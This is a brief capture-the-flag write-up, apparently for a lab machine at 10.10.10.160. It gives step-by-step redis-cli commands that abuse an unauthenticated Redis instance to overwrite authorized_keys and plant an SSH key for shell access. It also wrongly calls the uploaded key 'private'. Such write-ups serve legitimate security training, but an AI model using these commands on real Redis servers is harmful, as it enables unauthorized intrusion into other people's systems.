# Redis

## Exploit

https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md

I create an `SSH key` with `ssh-keygen`.

```bash
$ echo -e '\n\n' >> spaced_keys.txt
$ cat postman_keys.pub >> spaced_keys.txt
$ echo -e '\n\n' >> spaced_keys.txt
```

```bash
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/home/user/.ssh"
10.10.10.160:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "dump.rdb"
```

```bash
10.10.10.160:6379> CONFIG SET dbfilename "authorized_keys"
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/home/user/.ssh"
10.10.10.160:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
10.10.10.160:6379> flushall
```

I upload the private key on the redis in the `authorized_keys` file.

```bash
$ cat spaced_keys.txt | redis-cli -h 10.10.10.160 -x set sshblob
OK
$ redis-cli -h 10.10.10.160 save
OK
```